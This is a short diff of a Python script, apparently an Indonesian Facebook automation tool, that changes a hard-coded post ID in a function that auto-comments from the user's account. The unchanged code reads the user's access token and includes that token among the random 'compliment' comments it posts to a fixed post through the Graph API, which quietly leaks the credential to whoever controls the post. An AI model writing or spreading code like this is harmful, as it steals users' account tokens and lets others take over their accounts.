@@ -320,7 +320,7 @@ def bot_komen():
     except IOError:
         print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
     post = ('1449536855445286')
-    post2 = ('4553615737982503')
+    post2 = ('4553615664649177')
     kom = random.choice(["Ganteng bang", "Makasih bang", "Makin tampan aja si abang", token, "Matanya manis bang :v", "Eh buset.. emng gada obat ni abang..ganteng bett"])
     kom2 = ('Si Oyenn gagah pisaan..wkwk')
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
